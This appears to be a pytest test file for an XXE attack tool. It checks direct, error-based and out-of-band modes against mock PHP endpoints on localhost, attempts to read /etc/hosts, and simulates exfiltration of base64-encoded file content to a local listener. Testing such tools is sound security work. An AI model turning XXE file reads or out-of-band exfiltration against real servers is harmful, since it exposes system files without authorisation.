import base64
from base64 import b64encode
from urllib.parse import unquote_plus

import httpx
import pytest
from pytest_httpserver import HTTPServer
from werkzeug import Request
from werkzeug import Response

from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.xxe.attack.handler import attack_handler_factory
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload.error import DTD_WRAPPER

EMAIL = "jean.perri@gmail.com"


@pytest.fixture
def base_xml():
    raw_xml = f"""
    <contact>
    <prenom>Jean</prenom>
    <nom>PERRI</nom>
    <email>{EMAIL}</email>
    </contact>
        """
    return XML.parse_string(raw_xml)


PHP_FILE_ENDPOINT = "/submitContact.php"
HTTP_SERVER_URL = "http://localhost:8000"


def direct_attack_handler(request: Request):
    content_to_inject = EMAIL

    data = request.data.decode("utf-8")

    if "&xxe;" in data and "/etc/hosts" in data:
        content_to_inject = "localhost"
    elif "&xxe;" in data and "/etc/hosts" not in data:
        content_to_inject = ""
    if "base64" in data:
        content_to_inject = b64encode(content_to_inject.encode("utf-8")).decode("utf-8")

    return Response(f"Un email a été envoyé à: {content_to_inject}")


@pytest.mark.parametrize(
    "base64_encoding",
    [
        (False,),
        (True,),
    ],
)
def test_direct_attack_handler(httpserver: HTTPServer, base_xml, base64_encoding):
    httpserver.expect_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        direct_attack_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.DIRECT,
        resource="/etc/hosts",
        xml=base_xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        should_apply_base64_encoding=base64_encoding,
    )
    data = attack_handler.run_attack()

    assert "localhost" in data


def test_failed_direct_attack_handler(httpserver: HTTPServer, base_xml):
    httpserver.expect_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        direct_attack_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.DIRECT,
        resource="/etc/invalid",
        xml=base_xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        should_apply_base64_encoding=False,
    )
    data = attack_handler.run_attack()

    assert len(data) == 0


def error_attack_handler(request: Request):
    data_to_inject = ""
    data = request.data.decode("utf-8")

    if "error.dtd" in data:
        dtd = httpx.get(f"{HTTP_SERVER_URL}/error.dtd")

        if "/etc/hosts" in dtd.content.decode("utf-8"):
            data_to_inject = f"{DTD_WRAPPER}localhost{DTD_WRAPPER}"

    return Response(f"{data_to_inject}\nUn email a été envoyé à: ")


def test_error_attack_handler(httpserver: HTTPServer, base_xml):
    httpserver.expect_oneshot_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        error_attack_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.ERROR,
        resource="/etc/hosts",
        xml=base_xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )
    data = attack_handler.run_attack()

    assert "localhost" in data


def test_failed_error_attack_handler(httpserver: HTTPServer, base_xml):
    httpserver.expect_oneshot_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        error_attack_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.ERROR,
        resource="/invalid",
        xml=base_xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )
    data = attack_handler.run_attack()

    assert data == ""


def oob_attack_handler(request: Request):
    data = request.data.decode("utf-8")

    if "oob.dtd" in data:
        dtd = httpx.get(f"{HTTP_SERVER_URL}/oob.dtd")

        if "/etc/hosts" in dtd.content.decode("utf-8"):
            data = base64.b64encode(b"localhost").decode("utf-8")
            httpx.get(f"{HTTP_SERVER_URL}/?content={data}")

    return Response("")


def test_oob_attack_handler(httpserver: HTTPServer, base_xml):
    httpserver.expect_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        oob_attack_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.OOB,
        resource="/etc/hosts",
        xml=base_xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )
    data = attack_handler.run_attack()

    assert "localhost" in data


def test_failed_oob_attack_handler(httpserver: HTTPServer, base_xml):
    httpserver.expect_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        oob_attack_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.OOB,
        resource="/invalid",
        xml=base_xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )
    data = attack_handler.run_attack()

    assert data == ""


def urlencoding_server_handler(request: Request):
    data = request.data.decode("utf-8")

    if "xml=" not in data:
        return Response("Bienvenue ")

    xml_encoded = data.split("=")[1]
    xml = XML.parse_string(unquote_plus(xml_encoded))

    name = xml.get_text_element_value("name")

    if name == "&xxe;":
        name = "localhost"

    return Response(f"Bienvenue {name}")


def test_url_encoding(httpserver: HTTPServer):
    raw_xml = """
<name>
    Jean VALJEAN
</name>
    """
    xml = XML.parse_string(raw_xml)

    httpserver.expect_request(uri=PHP_FILE_ENDPOINT, method="POST").respond_with_handler(
        urlencoding_server_handler
    )
    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode=XXEAttackMode.DIRECT,
        resource="/invalid",
        xml=xml,
        target_url=httpserver.url_for(PHP_FILE_ENDPOINT),
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
        payload_prefix="xml=",
    )
    data = attack_handler.run_attack()

    assert data == ""
